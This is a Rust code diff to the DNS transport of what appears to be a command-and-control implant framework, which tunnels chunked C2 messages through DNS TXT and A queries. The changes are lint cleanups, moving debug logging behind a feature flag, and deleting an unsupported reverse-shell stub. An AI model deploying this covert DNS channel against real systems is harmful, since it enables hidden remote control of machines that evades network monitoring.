@@ -19,6 +19,7 @@ const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size
 
 /// DNS record type for queries
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[allow(clippy::upper_case_acronyms)]
 pub enum DnsRecordType {
     TXT,  // Text records (default, base32 encoded)
     A,    // IPv4 address records (binary data)
@@ -27,6 +28,7 @@ pub enum DnsRecordType {
 
 /// DNS transport using stateless packet protocol with protobuf
 #[derive(Debug, Clone)]
+#[allow(clippy::upper_case_acronyms)]
 pub struct DNS {
     base_domain: String,
     dns_server: String,
@@ -107,7 +109,7 @@ impl DNS {
 
         // Calculate total length
         let base_domain_len = self.base_domain.len();
-        let num_labels = (encoded.len() + MAX_LABEL_LENGTH - 1) / MAX_LABEL_LENGTH;
+        let num_labels = encoded.len().div_ceil(MAX_LABEL_LENGTH);
         let total_len = encoded.len() + num_labels + base_domain_len; // +num_labels for dots between labels, +1 for dot before base_domain
 
         if total_len > MAX_DNS_NAME_LENGTH {
@@ -143,7 +145,7 @@ impl DNS {
     /// Send packet and get response
     async fn send_packet(&self, packet: ConvPacket) -> Result<Vec<u8>> {
         let subdomain = self.build_subdomain(&packet).map_err(|e| {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::error!(
                 "DNS: Failed to build subdomain for packet type={}, seq={}: {}",
                 packet.r#type,
@@ -158,7 +160,7 @@ impl DNS {
         self.try_dns_query(&self.dns_server, &query, txid)
             .await
             .map_err(|e| {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!(
                     "DNS: Query failed for packet type={}, seq={}, conv_id={}: {}",
                     packet.r#type,
@@ -383,7 +385,7 @@ impl DNS {
             for (min_chunks, max_chunks) in varint_ranges.iter() {
                 // Calculate overhead assuming worst case (max sequence in this range)
                 let chunk_size = self.calculate_max_chunk_size(*max_chunks);
-                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
+                let total_chunks = request_data.len().div_ceil(chunk_size).max(1);
 
                 // Check if the calculated total_chunks falls within this range
                 if total_chunks >= *min_chunks as usize && total_chunks <= *max_chunks as usize {
@@ -396,14 +398,14 @@ impl DNS {
             // Fallback for very large data
             result.unwrap_or_else(|| {
                 let chunk_size = self.calculate_max_chunk_size(2097151);
-                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
+                let total_chunks = request_data.len().div_ceil(chunk_size).max(1);
                 (chunk_size, total_chunks)
             })
         };
 
         let data_crc = conv::calculate_crc32(request_data);
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: Request size={} bytes, chunks={}, chunk_size={} bytes, crc32={:#x}",
             request_data.len(),
@@ -433,7 +435,7 @@ impl DNS {
         let mut init_payload_bytes = Vec::new();
         init_payload.encode(&mut init_payload_bytes)?;
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: INIT packet - conv_id={}, method={}, total_chunks={}, file_size={}, data_crc32={:#x}",
             conv_id, method_code, total_chunks, data_size, data_crc
@@ -485,7 +487,7 @@ impl DNS {
                 }
             }
         } else {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::debug!(
                 "DNS: Unknown response format ({} bytes), retrying chunk",
                 response_data.len()
@@ -589,7 +591,7 @@ impl DNS {
             }
             (seq_num, Err(e)) => {
                 let err_msg = e.to_string();
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::error!("Failed to send chunk {}: {}", seq_num, err_msg);
 
                 // If packet is too long, this is a fatal error
@@ -635,7 +637,7 @@ impl DNS {
                 }
                 *retries += 1;
 
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::debug!(
                     "DNS: Retrying chunk {} (attempt {}/{}) for conv_id={}",
                     nack_seq,
@@ -682,7 +684,7 @@ impl DNS {
                             }
                         }
                         Err(e) => {
-                            #[cfg(debug_assertions)]
+                            #[cfg(feature = "print_debug")]
                             log::debug!(
                                 "DNS: Retry failed for chunk {} in conv_id={}: {}",
                                 nack_seq,
@@ -702,7 +704,7 @@ impl DNS {
 
     /// Send COMPLETE packet to server to confirm successful receipt and cleanup conversation
     async fn send_complete_packet(&mut self, conv_id: &str) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!("DNS: Sending COMPLETE packet for conv_id={}", conv_id);
 
         let complete_packet = ConvPacket {
@@ -724,7 +726,7 @@ impl DNS {
 
     /// Fetch response from server, handling potentially chunked responses
     async fn fetch_response(&mut self, conv_id: &str, total_chunks: usize) -> Result<Vec<u8>> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: All {} chunks acknowledged, sending FETCH",
             total_chunks
@@ -747,7 +749,7 @@ impl DNS {
             )
         })?;
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: FETCH response received ({} bytes)",
             end_response.len()
@@ -784,7 +786,7 @@ impl DNS {
         let expected_crc = metadata.data_crc32;
         let mut full_response = Vec::new();
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::debug!(
             "DNS: Fetching chunked response - {} chunks, expected_crc={:#x}, conv_id={}",
             total_chunks,
@@ -984,7 +986,7 @@ impl Transport for DNS {
             record_type,
         };
 
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::info!(
             "DNS transport initialized - server={}, domain={}, record_type={:?}",
             dns_server,
@@ -1114,16 +1116,6 @@ impl Transport for DNS {
         request: ReportOutputRequest,
     ) -> Result<ReportOutputResponse> {
         self.dns_exchange(request, "/c2.C2/ReportOutput").await
-    }
-
-    async fn reverse_shell(
-        &mut self,
-        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        Err(anyhow::anyhow!(
-            "reverse_shell not supported over DNS transport"
-        ))
     }
 
     fn get_type(&mut self) -> pb::c2::transport::Type {
@@ -1369,7 +1361,7 @@ mod tests {
             sequence: 1,
             conversation_id: "test1234".to_string(),
             data: vec![0xAA; 50], // 50 bytes of data
-            crc32: conv::calculate_crc32(&vec![0xAA; 50]),
+            crc32: conv::calculate_crc32(&[0xAA; 50]),
             acks: vec![],
             nacks: vec![],
         };
